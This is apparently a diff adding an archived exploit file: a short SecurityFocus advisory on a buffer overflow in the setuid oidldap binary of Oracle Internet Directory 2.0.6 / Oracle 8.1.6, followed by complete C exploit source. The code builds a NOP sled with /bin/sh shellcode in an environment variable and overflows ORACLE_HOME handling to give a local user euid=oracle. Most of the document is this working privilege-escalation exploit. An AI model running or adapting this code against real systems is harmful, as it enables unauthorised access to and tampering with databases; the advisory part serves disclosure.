@@ -1,0 +1,66 @@
+source: http://www.securityfocus.com/bid/1828/info
+
+Oracle Internet Directory 2.0.6 is a pre-alpha development release, available as both an addon package and in the Oracle Database Software release 8.1.6. A vulnerability has been found in the oidldap binary within the package.
+
+A buffer overflow exists in the oidldap binary, which is setuid oracle. When executed on the command line, the oidldap binary performs an unsafe check of the ORACLE_HOME environment variable. It is possible for a malicous user to execute shell code through the ORACLE_HOME environment variable, allowing the user to inherit an euid of oracle. In a stock installation of Oracle 8.1.6, this could create a scenario which would allow a local user to compromise the integrity of a database.
+
+/*
+Exploit Code for oidldapd in Oracle 8.1.6 (8ir2) for Linux. I tested in RH 6.2
+and 6.1. This code is a bullshit (i know please no comments about ;-)).
+
+If someone exports this to Sparc please tell me.
+
+synopsis: buffer overflow in oidldapd
+impact:   any user gain euid=oracle.
+
+
+Dedicated to PlazaSite guys. Klink Klink Team. Panxeta, Entrophy and others.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define DEFAULT_OFFSET                   13
+#define DEFAULT_BUFFER_SIZE             700
+#define NOP                            0x90
+#define ORACLE_HOME             "/usr/local/oracle/app/oracle/product/8.1.6"
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) {
+  char *buff, *ptr,*name[3],environ[100],binary[120];
+  long *addr_ptr, addr;
+  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+  int i;
+
+
+  buff = malloc(bsize);
+  addr = get_sp() - offset;
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  for (i = 0; i < bsize/2; i++)
+    buff[i] = NOP;
+
+  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+
+  memcpy(buff,"EGG=",4);
+  putenv(buff);
+  sprintf(environ,"ORACLE_HOME=%s",ORACLE_HOME);
+  putenv(environ);
+  sprintf(binary,"%s/bin/oidldapd connect=$EGG",ORACLE_HOME);
+  system(binary);
+}
